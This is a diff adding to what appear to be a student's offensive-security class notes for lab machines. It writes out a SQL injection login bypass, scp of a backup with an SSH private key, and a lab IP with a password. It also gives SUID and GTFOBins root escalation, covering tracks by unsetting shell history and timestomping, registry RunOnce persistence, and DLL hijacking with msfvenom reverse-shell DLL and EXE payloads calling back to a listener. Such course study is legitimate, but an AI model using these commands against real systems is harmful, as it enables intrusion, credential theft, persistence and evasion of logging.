@@ -262,7 +262,7 @@ Union is a lot like Pipe |
 
 
 
-for username and password 'tom' or 1='1'
+for username and password tom' or 1='1
 Run it, open f12 or the inspect, then go to network to the POST request. Click on raw, add a ? after php, and then copy the raw part
 
 
@@ -509,7 +509,6 @@ wiremask.eu
 
 
 
-
 Post Exploitation 
 _______________________________________________________________________________________________________________________
 
@@ -532,13 +531,13 @@ find / -iname "notes.*" 2>/dev/null
 
 
 
+scp /tmp/backup.tar.gz student@10.50.23.212:/home/student/Downloads
+lin-ops> tar -xvf backup.tar.gz
+lin-ops> chmod 600 .ssh/id_rsa
 
 
-
-
-
-
-
+ssh -S /tmp/hundo dummy -O forward -L 3550:192.168.28.9:3389
+xfreerdp /u:comrade /v:127.0.0.1:3550 -dynamic-resolution +glyphcache +clipboard
 
 
 
@@ -576,6 +575,8 @@ John the Ripper, an automated password cracker.
 
 
 
+FROM 192.168.150.245
+nP7QmWqMn1usz3HiQECU
 
 
 
@@ -593,7 +594,125 @@ John the Ripper, an automated password cracker.
 
 
 
+Privilege Escalation, Persistence & Covering Your Tracks
+Linux
+_______________________________________________________________________________________________________________________
 
+Enumerate for privilege escalation
+sudo -l
+
+find / -type f -perm /4000 -ls 2>/dev/null # Find SUID only files
+find / -type f -perm /2000 -ls 2>/dev/null # Find SGID only files
+find / -type f -perm /6000 -ls 2>/dev/null # Find SUID and/or SGID files
+GTFO bins use the website for any of thse ^
+
+. in path - instead of running actual path will look at current directory, so you could hide a nc listener on the ls command
+if the cron cannot be edited, edit what the cron is pointing to
+/tmp, /var/tmp, and more are world-writable files and folders
+
+Persistence is surviving the reboot
+
+boot process persistence
+
+------------------------------- COVERING YOUR TRACKS ------------------------------- 
+Be very careful of each log that is created and each step you take
+Be aware of syslog and rsyslog
+/etc/rsyslog.conf
+unset HISTFILE
+
+ausearch: pulls from audit.log
+audit log has login information, such as failed or successful attempts
+
+SystemD
+utilize journalctl
+
+timestomp
+
+
+DEMO
+demo@lin-ops> /etc/host
+demo@lin-ops> sudo -l
+google gtfobins and throw the binary in it
+demo@lin-ops> sudo apt-get changelog apt
+# whoami
+root
+# bash
+root@lin-ops>
+demo@lin-ops> find / -type f -perm /2000 -ls 2>/dev/null # Find SGID only files
+same thing with the gtfobins but look for suid instead of sudo
+demo@lin-ops> ls /tmp/
+demo@lin-ops> cat /etc/crontab
+demo@lin-ops> echo $PATH
+demo@lin-ops> locate echo
+We won't need to do the weird replace command thing but we will need to be able to identify it
+demo@lin-ops> 
+lin-ops>
+lin-ops>
+lin-ops>
+lin-ops>
+
+
+touch -t doesn't count for miliseconds
+touch -r just connects it to another file, also including miliseconds
+
+
+
+
+john --wordlist=10-million-password-list-top-10000.txt shadowfile
+
+
+
+Privilege Escalation, Persistence & Covering Your Tracks
+Windows
+_______________________________________________________________________________________________________________________
+
+
+
+AutoElevate Executables
+Requested Execution Levels:
+ - asInvoker
+ - highestAvailable
+cmd prompt and powershell are both asInvoker
+
+Scheduled Task & Services
+Practically the same thing, schedtask or get-task and other through services
+
+HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+
+Schedtask or get-task
+
+We clean windows with delete
+
+
+
+
+xfreerdp for this class
+
+first thing to do is attempt to run a cmd or powershell as an admin
+look for vulnerable programs with get-service or just running services (every user can see every service)
+search for strange naming or poor descriptions
+They will give us different dll or exe so that we don't break shit
+dll hijacking 
+procmon.exe /accepteula
+process name contains putty.exe include
+Path contains .dll include
+result is NAME NOT FOUND include
+open lin-ops and go onto msfvenom
+msfvenom -p windows/shell_reverse_tcp LHOST=10.50.23.212 LPORT=7777 -b '\x00' -f dll > SSPICLI.dll
+win-ops> scp student@10.50.23.212:SSPICLI.dll .
+msfconsole 
+set payload windows/shell/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 7777
+run
+then run putty on the windows and it should work
+OR 
+msfvenom -p windows/exec CMD="cmd.exe /C whoami > "C:\\whoami.txt"" -b '\x00' -f dll > SSPICLI.dll
+for exe do this, do not delete the original exe just rename it so this takes control. IF YOU CAN DO THIS DO IT
+msfvenom -p windows/exec CMD="cmd.exe /C whoami > "C:\\whoami.txt"" -b '\x00' -f exe > putty.exe
+
+look at .c files
 
 
 
